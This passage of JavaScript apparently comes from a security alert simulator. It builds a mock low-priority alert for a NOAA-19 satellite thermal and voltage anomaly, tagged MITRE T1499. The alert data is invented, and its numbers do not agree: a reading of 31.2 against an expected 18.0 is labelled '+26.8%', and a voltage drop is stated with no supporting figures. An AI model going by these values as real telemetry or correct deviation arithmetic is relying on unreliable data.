          sourceName: 'Satellite (NASA Telemanom)',
          asset: 'SAT-NOAA-19',
          indicator: 'subsystem: EPS_POWER_AND_THERMAL (+26.8% thermal, -13.9% voltage)',
          sourceSeverity: 'MEDIUM',
          priority: 'LOW',
          priorityReason:
            'Sentinel-X Safety Policy: Operational space telemetry deviation without corroborating cyber indicators is maintained as operational anomaly (Priority: LOW).',
          confidence: 68,
          correlationConfidence: 22,
          behavioralMatch: 'Spacecraft thermal gradient deviation during orbital transition',
          mitreId: 'T1499',
          mitreName: 'Endpoint Denial of Service (Operational)',
          mitreTactic: 'Impact',
          mitreDescription:
            'Adversaries may target system availability, but space telemetry deviations are evaluated under physical spaceflight dynamics first.',
          whatHappened:
            'SAT-NOAA-19 electrical and thermal subsystem recorded a +26.8% temperature elevation following eclipse exit. Zero unauthorized commands or ground uplink anomalies were detected.',
          telemetryDetail: {
            parameter: 'EPS Thermal Sensor 3 & Bus Voltage',
            observed: 31.2,
            expected: 18.0,
            deviation: '+26.8% thermal',
            isAnomaly: true,
          },
          whyPrioritized: [
            '+ Real-time spacecraft telemetry exceeds statistical baseline threshold by 2.6 sigma',
            '- No corroborating cyber telemetry or unauthorized uplink commands observed',
            '- Physical sensor behavior correlates with solar exposure cycle upon eclipse emergence',
            '- Sentinel-X safety rule strictly isolates telemetry anomalies from cyber incidents without dual-stream corroboration',
          ],
          evidenceTimeline: [
            {
              time: timeStr,
              event: 'Thermal sensor deviation (+26.8%) recorded',
              source: 'Satellite (NASA Telemanom)',
              detail: 'EPS_POWER_AND_THERMAL parameter shifted to 31.2°C during orbit transition',
            },
          ],
          recommendedAction:
            'Alert Flight Dynamics Team to inspect thermal radiator positioning. Maintain operational classification unless cyber telemetry is detected.',
          correlationStatus: 'STANDALONE',
          rawReference: `space://telemetry/noaa19/eps/${eventId}.json`,
          status: 'Investigating',
        };

        return { simEvent, newAlert };
      }

      default:
        throw new Error(`Unknown scenario: ${scenario}`);
    }
  },
};
